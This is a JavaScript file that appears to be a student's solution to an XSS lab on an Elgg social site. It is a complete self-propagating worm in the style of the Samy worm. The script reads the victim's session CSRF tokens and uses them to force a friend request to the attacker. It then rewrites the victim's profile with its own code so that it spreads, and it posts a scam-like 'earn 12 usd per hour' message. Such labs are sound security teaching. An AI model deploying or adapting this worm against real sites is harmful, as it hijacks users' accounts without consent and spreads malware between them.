<script id=worm>

	window.onload = function () {


	/*
		First, I (as Samy), get my guID from elgg var, which is needed to add someone ase a friend
		For Samy's case, It was 47
		Then I send a random friend req and inspect the network req from browser utility.
		Then I designed my exploit from it's template 

	*/


	var info = elgg.session.user

	// ensuring that the victim is not Samy

	if(info.guid != 47) {

		

		//   add Samy as a friend.
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		var fid="friend=47"
		var freq="http://www.xsslabelgg.com/action/friends/add?"+fid+""+ts+""+token+""+ts+""+token+"" //FILL IN

		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",freq,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
		




		
		// replicating... we can put this code at any place though
		var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
		var jsCode = document.getElementById("worm").innerHTML;
		var tailTag = "</" + "script>";
		var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
		

		// lets update the profile of the victim with this code
		// it is noticable that, I Updated the description with wormCode.. to 
		var editprof="http://www.xsslabelgg.com/action/profile/edit"

		var data=`&__elgg_ts=${elgg.security.token.__elgg_ts}
				&__elgg_token=${elgg.security.token.__elgg_token}
				&accesslevel[briefdescription]=1
				&accesslevel[contactemail]=1
				&accesslevel[description]=1
				&accesslevel[interests]=1
				&accesslevel[location]=1
				&accesslevel[mobile]=1
				&accesslevel[phone]=1
				&accesslevel[skills]=1
				&accesslevel[twitter]=1
				&accesslevel[website]=1
				&briefdescription=Samy'r+jonno+pagol
				&contactemail	
				&description=${wormCode}
				&guid=${info.guid}
				&interests=Samy
				&location=Samy+r+mon
				&mobile	
				&name=${info.name}
				&phone	
				&skills	Samy+r+sathe+kotha+bola
				&twitter	
				&website	`;



		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",editprof,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(data);


		// posting on wire

		var postwire="http://www.xsslabelgg.com/action/thewire/add" 
		var link = "http://www.xsslabelgg.com/profile/samy"

		var post=`__elgg_token=${elgg.security.token.__elgg_token}
				&__elgg_ts=${elgg.security.token.__elgg_ts}
				&body=to earn 12 usd per hour, pls visit ${link} `; //FILL IN

		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",postwire,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(post);
		

		

	}



	}
</script>